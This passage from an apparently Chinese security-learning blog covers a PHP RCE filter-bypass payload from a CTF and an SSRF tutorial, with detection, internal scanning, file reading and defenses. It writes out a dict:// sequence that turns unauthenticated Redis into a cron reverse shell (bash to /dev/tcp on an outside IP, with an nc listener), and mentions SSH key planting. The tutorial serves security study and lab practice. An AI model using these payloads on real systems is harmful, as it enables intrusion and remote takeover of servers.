src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733922167560-8991d290-5747-41a9-b33b-5a8ed97d2790.png"></p><p>过滤了很多东西，但是过滤的是中文括号，不是英文括号，构造只含有英文括号的payload</p><p>打印当初路径下文件的函数:print_r(scandir(‘.’))</p><p>单引号和小数点已经过滤了，这里要先绕过</p><p>最简单的方法是利用函数传参，那就找当前能用包含小数点的函数</p><p>localeconv()      返回一包含本地数字及货币格式信息的数组</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(localeconv());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733925087877-7c22bf51-dc18-4d5b-89ba-54b246027f07.png"></p><p>我们需要获得这个数组的第一个索引值</p><p>接下来思路就是构造：print_r(scandir(localeconv()[0]))</p><p>但是这个函数是不能localeconv()[0]这样返回的，而且方括号也被过滤了，那么就要用到别的函数</p><ol><li>current() 函数返回数组中的当前元素（单元）,默认取第一个值，</li><li>pos() 同 current() ,是current()的别名</li><li>reset() 函数返回数组第一个单元的值，如果数组为空则返回 FALSE</li></ol><p>这里三个函数都可以用</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733925020949-19ec6f13-7489-44a5-ac08-6e32a0c5f7c5.png"></p><p>因此打印当前目录：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733925137217-3d0c1578-8c00-4f4b-863c-fa4371195829.png"></p><p>当前目录为数组打印，继续获得目录数组的具体内容</p><p>这里可以的用next()</p><p>输出数组中的当前元素的下一个元素的值,也就是可以输出第二个（还有end可以输出最后一个）</p><p>但是flag在第三个怎么办？可以用array_reverse函数</p><p>这个函数就是将数组转置；</p><p>最终payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733925177251-652cccf0-ada8-4bf5-93b3-6fa7bd906eec.png"></p><p>show_source也可以换成highlight_file</p><h2 id="41"><a href="#41" class="headerlink" title="41"></a>41</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733926722001-3e4ac98b-a06a-4762-85a8-eb35aed57935.png"></p><p>分析正则，貌似过滤了所有数字和小写字母，后面还有个&#x2F;i，大写字母也没了</p><p>其实看到这种全过滤，反倒是只有一种解法，就是构造字符串</p><p>&amp; 按位与 |按位或 ^ 按位异或 ~取反 为四大位运算符，其中按位异 | 没有过滤，过滤的字符是防异或、自增和取反构造字符</p><p>继续使用大佬的脚本<a href="https://www.cnblogs.com/aninock/p/15125215.html">https://www.cnblogs.com/aninock/p/15125215.html</a></p><p>如果出现了报错可以将url中的http改为https</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733927421614-dbaa367c-dee4-440f-bc63-a735d061f76f.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733927457377-b90df0ef-801a-4351-b1a8-fbc3b426152e.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733927507045-614032d4-8f15-4ae4-aa23-3a7b50288ac3.png"></p><h1 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h1><p>要思考哪些功能点会执行代码或者命令，但是这种不太常见，也可以直接利用工具帮忙探测(awvs、xray等)</p>]]></content>
      
      
      <categories>
          
          <category> OWASP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/2025/05/27/SSRF/"/>
      <url>/2025/05/27/SSRF/</url>
      
        <content type="html"><![CDATA[<p>服务器端请求伪造</p><h1 id="客户端请求-服务器端请求"><a href="#客户端请求-服务器端请求" class="headerlink" title="客户端请求&amp;服务器端请求"></a>客户端请求&amp;服务器端请求</h1><ol><li>客户端请求</li></ol><p>由客户端设备（个人计算机、电脑手机等）或软件（浏览器、APP）发出的请求，以获取指定的网页、图片、视频或其他资源。比如当用户在浏览器中输入url或点击链接时，浏览器会自动发起HTTP请求，请求服务器返回指定的资源</p><ol start="2"><li>服务器端请求</li></ol><p>服务器上的应用程序或服务会提供一些功能接口，比如API接口，用于与其他服务进行数据交互。这些由服务器向其他的服务器发起的请求称之为服务器端请求。</p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>服务器端请求伪造（Server–side Request Forgery）简称SSRF，是指攻击者通过伪造服务器端请求，从而使服务器发起对第三方系统的攻击或访问。攻击者通常会使用受害者服务器上的应用程序作为代理来发起请求，以使请求看起来像是由服务器发起的。</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726060693286-9d519217-4721-46f8-9896-b5a1905fec63.png"></p><h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><p>由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726060843061-0573f736-b1d7-44ab-a0c7-4391a6d099ef.png"></p><h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><ol><li>窃取数据：攻击者可以伪造请求以访问服务器内部网络或云环境中的其他服务或资源，以窃取敏感数据。</li><li>攻击第三方系统：攻击者可以伪造请求以攻击第三方系统，例如访问其他组织的敏感数据或执行拒绝服务攻击DDOS。</li><li>内部端口扫描：攻击者可以伪造请求以扫描服务器内部端口和服务，以寻找其他可能的漏洞。</li><li>获取指纹信息：通过获取web应用可达服务器服务的指纹信息。</li></ol><blockquote><p>请求内网敏感数据</p></blockquote><h1 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h1><p>SSRF漏洞一般存在于Web应用程序中，这些应用程序接受来自用户的输入，然后将其用于向其他服务器发出请求。攻击者可以在输入中注入恶意的URL，从而使服务器发起未经授权的请求，以访问敏感的内部资源。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件上传功能：Web应用程序通常允许用户上传文件，攻击者可以上传包含恶意URL的文件，以触发SSRF漏洞。</span><br><span class="line"></span><br><span class="line">图片处理功能：Web应用程序通常包含图片处理功能，攻击者可以在图片URL中注入恶意的URL，以触发SSRF漏洞。</span><br><span class="line"></span><br><span class="line">URL重定向功能：Web应用程序可能包含URL重定向功能，攻击者可以在重定向URL中注入恶意的URL，以触发SSRF漏洞。</span><br><span class="line"></span><br><span class="line">API调用：Web应用程序可能会使用API与其他服务进行交互，攻击者可以在API请求中注入恶意的URL，以触发SSRF漏洞。</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726127158863-f555fd21-e5b5-409b-86e5-207831f59de7.png"></p><h1 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h1><p>php：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这些函数用于发出HTTP请求，包括常见的函数如curl_exec() 、file_get_contents()、fsockopen()。如果这些函数允许从用户输入中获取URL，但未正确验证和过滤用户输入，攻击者可以通过在URL中注入恶意代码来触发SSRF漏洞。</span><br></pre></td></tr></table></figure><p>java：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">仅支持 HTTP/HTTPS 协议的类：HttpClient 类、HttpURLConnection 类、 OkHttp 类、 Request 类</span><br><span class="line">支持 sun.net.www.protocol 所有协议的类：URLConnection 类、URL 类、ImageIO 类</span><br></pre></td></tr></table></figure><h2 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec"></a>curl_exec</h2><p>格式：curl_exec(resource $ch)</p><p>作用：执行cURL会话</p><p>新建php文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建一个cURL资源</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置URL和相应的选项</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="string">&quot;http://www.baidu.com/&quot;</span>);</span><br><span class="line"><span class="comment">// 设置不包括响应头信息，只返回正文内容</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 将SSL证书验证设置为false，即不验证对等证书</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>);</span><br><span class="line"><span class="comment">// 将SSL主机验证设置为FALSE，即不验证主机</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="literal">FALSE</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当我们访问这个网页时，会跳转到<a href="http://www.baidu.com/">http://www.baidu.com</a></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726127564878-6e44c836-1d7a-448e-9d37-fd19e511614a.png"></p><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><p>格式：file_get_contents(path,include_path,context,start,max_length)</p><p>作用：把整个文件读入一个字符串中。将整个文件或一个url所指向的文件读入一个字符串中。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$content</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="variable">$filename</span>=<span class="string">&#x27;./images/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">echo</span><span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$img</span>=<span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span><span class="variable">$img</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在该目录下创建一个images文件夹，用于接收生成的文件</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726128400332-03422f5c-2e73-43aa-ad3f-d13bb61153c3.png"></p><p>自行传入url参数，之后在images文件夹下，可以看到生成的文件，文件内容与我们传入的参数相关</p><h2 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen"></a>fsockopen</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;192.168.81.236&quot;</span>, <span class="number">9998</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: 192.168.81.236\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>更改ip信息</p></blockquote><p>开启本机http服务</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726129136925-7c7ddd46-52f2-4e98-824f-d2b6c4771ef5.png"></p><p>访问php文件</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726129099618-8b7a06ef-6ec7-4c5a-8b0d-40d9bd403978.png"></p><p>该电脑的文件目录能够显示出来</p><h1 id="判断是否存在SSRF"><a href="#判断是否存在SSRF" class="headerlink" title="判断是否存在SSRF"></a>判断是否存在SSRF</h1><p>在无回显(Blid)的SSRF攻击中，攻击者无法直接获取目标系统返回的响应，因此需要寻找一种方法来间接地确认攻击是否成功。</p><p>DNSLog：是一种常用的间接确认方法，它通过向一个域名提交请求，然后查看DNS服务器的日志来获取该域名的请求记录，从而确认攻击是否成功。</p><p>攻击者可以在SSRF漏洞中注入带有DNSLog服务地址的URL,并将该URL发送到目标服务器上，当目标服务器对该URL进行请求时，DNSLog服务将接收到请求并记录在日志中。攻击者可以定期查看DNSLog的日志，以确认目标服务器是否对该URL进行了请求。</p><blockquote><p>无回显SSRF，使用DNSlog平台来测试有没有SSRF漏洞</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726131076236-f1d2d101-3b79-4e68-aea2-ae14d8407aeb.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726131067338-73869f23-278b-4bae-95d4-5f678acba696.png"></p><p>dnslog平台有记录，说明存在ssrf漏洞</p></blockquote><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>网络信息</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726131220019-d2677d0c-2eef-4134-b828-6260e44eeae3.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726131269365-c65be5d2-3d57-43c0-8226-7062cd7667d0.png"></p><blockquote><p>靶场有三个容器</p></blockquote><h2 id="读取敏感文件"><a href="#读取敏感文件" class="headerlink" title="读取敏感文件"></a>读取敏感文件</h2><p>file协议读取敏感文件</p><p>格式：file:&#x2F;&#x2F;filepath（通常file后面&#x2F;&#x2F;&#x2F;是因为最后的&#x2F;表示根目录）</p><blockquote><p>读取的是目标服务器本地的文件，无法读取其他服务器的文件</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726132256528-3a59d7b0-8519-48ae-b6e9-891c13624665.png"></p><blockquote><p>访问的是ssrf-web这个容器的80端口</p></blockquote><p>&#x2F;etc&#x2F;passwd</p><p>&#x2F;etc&#x2F;hosts</p><p>hosts文件主要作用是定义IP地址和主机名的映射关系，是一个映射IP地址和主机名的规定。可以用文本文件打开！当用户在浏览器中输入一个网址时，系统会首先自动从hosts文件中寻找对应的IP地址，一旦找到，浏览器会立即打开对应网页，如果没有找到，则浏览器会将网址提交DNS服务器进行IP地址解析。简单来说就是负责地址与域名快速解析的文件，读取文件可以得到内网所在网段。</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726133322928-ede363b2-613b-47b2-9f06-c32300dba210.png"></p><h2 id="探测同c段其他主机"><a href="#探测同c段其他主机" class="headerlink" title="探测同c段其他主机"></a>探测同c段其他主机</h2><p>由于读取&#x2F;etc&#x2F;hosts文件可以得到所在的内网ip，我们可以对同C段其他主机进行爆破</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726196446593-a198f031-ce02-4780-a589-031ce3ef66f3.png"></p><p>ip为172.20.0.4，我们对4进行爆破（0-255）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726196572716-8581c058-963a-4d6e-b5e5-443d3318c2f3.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726196678843-9f65a4a0-8d03-44cb-a003-4d6a3fbf24d2.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726196670491-9814bbec-c88b-42bd-a4ef-966ab62322f4.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726198084427-11f6181f-d3d9-430e-ad8d-c61d3840f4d4.png"></p><p>看响应时间，时间短的即为可能存在的主机</p><blockquote><p>.1和.254一般不是主机，一般是网关</p><p>172.20.0.2</p><p>172.20.0.3</p><p>172.20.0.4</p></blockquote><h2 id="探测内网服务-dict"><a href="#探测内网服务-dict" class="headerlink" title="探测内网服务-dict"></a>探测内网服务-dict</h2><p>格式：dict:&#x2F;&#x2F;</p><p>作用：dict是一个在线网络字典协议，用来架设一个字典服务。在SSRF中，常常用来探测内网的应用信息</p><p>我们使用dict可以探测端口是否开放</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726201010041-59985f49-0425-4f74-bd6a-69eff4be4b65.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726201091803-5d72a3f1-2741-4eb5-9fe2-1b4f20d73ac8.png"></p><blockquote><p>探测.3的主机是否开放22端口：开放了； 6379端口：开放了</p></blockquote><p>172.20.0.2 - （本机</p><p>172.20.0.3 - 22 6379 </p><p>172.20.0.4 - 6379</p><h2 id="通过dict-协议攻击内网Redis"><a href="#通过dict-协议攻击内网Redis" class="headerlink" title="通过dict:&#x2F;&#x2F;协议攻击内网Redis"></a>通过dict:&#x2F;&#x2F;协议攻击内网Redis</h2><p>Redis是一个key-value存储系统，是跨平台的非关系型数据库。（键值对）</p><p>Redis一般绑定在本地的6379端口上，如果在没有开启认证的情况下，可以导致任意用户利用ssrf漏洞攻击内网中的未授权Redisl以及读取Redis的数据。</p><p>攻击者在未授权访问Redis的情况下可以利用Redis的相关方法，如果运行redis的用户是root用户，攻击者可以通过写定时任务的方式进行反弹shell。</p><p>测试redis是否存在未授权漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict://ip:port/info</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726202043161-3ed621e8-22c8-4a0e-9f02-62dec6a2ea28.png"></p><blockquote><p>存在</p></blockquote><p>存在redis未授权之后可以</p><h3 id="写定时任务"><a href="#写定时任务" class="headerlink" title="写定时任务"></a>写定时任务</h3><p>定时任务是通过crond来完成，crond是一个linux下的定时执行工具。不同的系统定时任务保存的目录不同，centos的定时任务保存在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;目录下，ubuntu的定时任务保存在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;.目录下.</p><ol><li>可以根据服务器是否存在以下文件判断服务器信息</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Centos</span><br><span class="line">/etc/redhat-release</span><br><span class="line"># Ubuntu</span><br><span class="line">/etc/lsb-release</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726202506232-e5799f87-e065-4cca-9e0a-fec28c478667.png"></p><ol start="2"><li>在攻击主机（如果你的攻击目标是本地靶场，那攻击机可以使用kali;如果攻击目标是公网服务器，则接收反弹shell的机器也需要是公网服务器）监听一个端口，用以接收受害主机执行的定时任务所反弹回来的shell</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure><ol start="3"><li>在存在漏洞的网站依次执行</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 清空数据库（慎用）</span><br><span class="line">dict://127.0.0.1:6379/flushall</span><br><span class="line"># 设置工作目录</span><br><span class="line">dict://127.0.0.1:6379/config set dir /var/spool/cron/</span><br><span class="line"># 设置保存的文件名</span><br><span class="line">dict://127.0.0.1:6379/config set dbfilename root</span><br><span class="line"># 设置变量x，如果你是在本地虚拟机kali监听，则下方的ip也需要修改为kali</span><br><span class="line">dict://127.0.0.1:6379/set x &quot;\n*/2 * * * * bash -i &amp;&gt; /dev/tcp/122.114.225.41/1234 0&gt;&amp;1\n&quot;</span><br><span class="line"># 保存</span><br><span class="line">dict://127.0.0.1:6379/save</span><br><span class="line"></span><br><span class="line">//127.0.0.1改成6379端口开放的那个主机</span><br></pre></td></tr></table></figure><ol start="4"><li>攻击成功后攻击者监听的端口会接收到反弹回来的shell</li></ol><h3 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h3><p>SSH密钥对可以让您方便的登录到SSH服务器，而无需输入密码。SSH密钥对总是成双出现的，一把公钥，一把私钥。公钥可以自由的放在您所需要连接的SSH服务器上，而私钥必须的保管好。</p><p>公钥登录，很多时候也说public key认证，公钥登录的原理：首先用户将自己的公钥存储在需要登录的远程机器上面，然后登录的时候，远程主机会向用户发送一段随机字符串，接着用户使用自己的私钥加密字符串，并发给远程主机。最后，远程主机使用存储的公钥进行解密，若解密成功，则说明用户可信，准许登录，不再提示输入密码。</p><p>1、服务端会将客户端发的公钥写入到<del>&#x2F;.ssh&#x2F;authorized_keys文件末尾。（</del>为当前用户根目录）</p><p>2、公钥和私钥在客户端（登录端）生成</p><p>攻击流程：</p><ol><li>探测是否存在漏洞，比如说读取文件</li></ol><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726576114025-b2fa5217-d554-47fd-bb83-fda7a0b849db.png"></p><ol><li>探测端口，看22端口是否开放，6379端口是否开放</li><li>测试redis是否存在未授权访问漏洞</li><li>通过redis写ssh公钥，首先攻击方生成一对ssh key，默认情况下，生成后在用户的家目录下的.ssh目录下</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>服务器请求来源于业务本身的正常功能，比如图片的请求等，有的人动了坏心思，服务器端请求伪造漏洞。为了防御SSRF,目前主要有以下几个手段：</p><ol><li>白名单：设置用户提交的url白名单，比如，用户在访问<a href="http://www.example.com时,提交的url只允许是来自example.com的/">www.example.com时，提交的url只允许是来自example.com的</a></li><li>协议限制：限制只能使用http、https请求，可以避免如file:&#x2F;&#x2F;、ftp:&#x2F;&#x2F;等情况带来的文件泄露；</li><li>过滤返回信息：针对服务端返回的信息进行过滤，比如服务本身是去获取jpg格式的图片，那么返回其他的内容，就是不符合标准的，可以进行报错处理；</li><li>统一错误信息：只显示固定几种错误信息，使SSRF事实上成为无回显类型。</li></ol><h1 id="SSRF无回显解决方案"><a href="#SSRF无回显解决方案" class="headerlink" title="SSRF无回显解决方案"></a>SSRF无回显解决方案</h1><p>跟RCE无回显道理是一样的，两种解决方法：</p><p>反向连接（一般SSRF都是用这个反向连接方式，因为SSRF无法写文件）：让疑似存在RCE(SSRF)的目标请求外部一个网站，dnslog或者自己用vps python启用一个web服务，当dnslog或者自启用网站能接收到请求信息时，不就代表目标存在RCE(SSRF)) </p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733586061980-4b6f5f4c-0681-4b30-bb4e-91fc814dd757.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733586061788-d3d7b31a-2865-465b-9fb8-5ccce9da3c98.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733586061792-41319436-370a-46a9-8afa-750fc727f77c.png"></p><p>正向连接（一般RCE执行可以用这个方式， SSRF得用第一种方式）</p><p>写个文件在对方网站目录下，然后再去访问网站目录是否存在这个文件就能判断目标是否执行了RCE命令</p><p>让目标用nc起个监听，我们主动连过去。</p><h1 id="SSRF漏洞挖掘思路"><a href="#SSRF漏洞挖掘思路" class="headerlink" title="SSRF漏洞挖掘思路"></a>SSRF漏洞挖掘思路</h1><p>黑盒探针：业务功能点</p><ol><li>社交分享功能：获取超链接的标题等内容进行显示</li><li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：给网址翻译对应网页的内容</li><li>图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</li><li>图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</li><li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</li><li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li><li>数据库内置功能：数据库的比如mongodb的copyDatabase函数</li><li>邮件系统：比如接收邮件服务器地址</li><li>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li><li>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</li></ol><p>URL关键参数：</p><ol><li>share</li><li>wap</li><li>url</li><li>link</li><li>src</li><li>source</li><li>target</li><li>u</li><li>display</li><li>sourceURl</li><li>imageURL</li><li>domain</li></ol><p>白盒分析：主要是看文件读取，加载，数据操作类的函数</p><h1 id="SSRF协议利用"><a href="#SSRF协议利用" class="headerlink" title="SSRF协议利用"></a>SSRF协议利用</h1><p><font style="background-color:rgba(255, 255, 255, 0);">http:&#x2F;&#x2F;  Web常见访问，如<a href="http://127.0.0.1/">http://127.0.0.1</a></font></p><p><font style="background-color:rgba(255, 255, 255, 0);">file:&#x2F;&#x2F;&#x2F; 从文件系统中获取文件内容，如，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</font></p><p><font style="background-color:rgba(255, 255, 255, 0);">dict:&#x2F;&#x2F; 字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info：</font></p><p><font style="background-color:rgba(255, 255, 255, 0);">sftp:&#x2F;&#x2F; SSH文件传输协议或安全文件传输协议</font></p><p><font style="background-color:rgba(255, 255, 255, 0);">ldap:&#x2F;&#x2F; 轻量级目录访问协议</font></p><p><font style="background-color:rgba(255, 255, 255, 0);">tftp:&#x2F;&#x2F; 简单文件传输协议</font></p><p><font style="background-color:rgba(255, 255, 255, 0);">gopher:&#x2F;&#x2F; 分布式文档传递服务，可使用gopherus生成payload</font></p><p><font style="background-color:rgba(255, 255, 255, 0);">由于有部分协议http这类不支持，可以gopher来进行通讯（mysql，redis等）</font></p><p><font style="background-color:rgba(255, 255, 255, 0);">应用：漏洞利用 或 信息收集 通讯相关服务的时候 工具：Gopherus</font></p><h2 id="http-（常用）"><a href="#http-（常用）" class="headerlink" title="http:&#x2F;&#x2F; （常用）"></a><font style="background-color:rgba(255, 255, 255, 0);">http:&#x2F;&#x2F; （常用）</font></h2><p><font style="background-color:rgba(255, 255, 255, 0);">Web常见访问，如<a href="http://127.0.0.1、http//127.0.0.1:8080%E3%80%81http://192.168.1.1%E3%80%81http://192.168.1.2%E7%AD%89">http://127.0.0.1、http://127.0.0.1:8080、http://192.168.1.1、http://192.168.1.2等</a></font></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733586729203-2be143ec-88b3-4a31-9e70-9d5225f7f61d.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733586728962-c4e36ea9-dc1f-40d1-a938-8271a5669ac1.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733586728928-a83b3f68-d16e-4c94-86e5-101ba4b449f9.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733586728983-76763995-2721-47f9-a42d-d9da9b9025df.png"></p><h2 id="file-（常用）"><a href="#file-（常用）" class="headerlink" title="file:&#x2F;&#x2F;&#x2F; （常用）"></a>file:&#x2F;&#x2F;&#x2F; （常用）</h2><p>从文件系统中获取文件内容，如，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd、file:&#x2F;&#x2F;&#x2F;D:&#x2F;1.txt</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733586768939-08145aae-8eec-4bc3-a8c2-33724f5d1fc1.png"></p><h2 id="dict-（常用）"><a href="#dict-（常用）" class="headerlink" title="dict:&#x2F;&#x2F; （常用）"></a>dict:&#x2F;&#x2F; （常用）</h2><p>字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;&#x2F;ip:6379&#x2F;info</p><h2 id="sftp"><a href="#sftp" class="headerlink" 